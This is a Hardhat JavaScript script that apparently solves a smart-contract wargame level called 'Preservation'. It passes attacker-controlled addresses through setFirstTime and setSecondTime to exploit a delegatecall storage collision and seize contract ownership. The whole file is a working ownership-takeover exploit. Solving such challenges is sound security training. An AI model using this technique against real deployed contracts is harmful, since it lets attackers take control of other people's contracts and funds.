const hre = require("hardhat");
require("dotenv").config();

async function main() {
  // Setup accounts
  [attacker] = await ethers.getSigners();

  const INSTANCE_ADDRESS = "0x6D14136daAE090B09FeC465470BAc848fa981782";
  const ATTACK_ADDRESS_ONE = "0xf7B7Fc2561AD368321D0891f53d0a75abCB5EdE3";
  const ATTACK_ADDRESS_TWO = "0x05d107b4D9D70853855CCfFA2478B86b0e1d0d2E";

  // Fetch instance contract
  const preservation = await hre.ethers.getContractAt("Preservation", INSTANCE_ADDRESS);
  console.log(`Preservation contract fetched at ${preservation.address}`);

  // Approve attack contract
  const ADDRESS_ONE_TO_NUMBER = (BigInt(ATTACK_ADDRESS_ONE)).toString();
  await (await preservation.connect(attacker).setFirstTime(ADDRESS_ONE_TO_NUMBER, { gasLimit: 200000 })).wait();

  const ADDRESS_TWO_TO_NUMBER = (BigInt(ATTACK_ADDRESS_TWO)).toString();
  await (await preservation.connect(attacker).setFirstTime(ADDRESS_TWO_TO_NUMBER, { gasLimit: 200000 })).wait();

  const ATTACKER_ADDRESS_TO_NUMBER = (BigInt(attacker.address)).toString();
  await (await preservation.connect(attacker).setSecondTime(ATTACKER_ADDRESS_TO_NUMBER, { gasLimit: 200000 })).wait();

  console.log(`Contract Owner: ${await preservation.owner()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});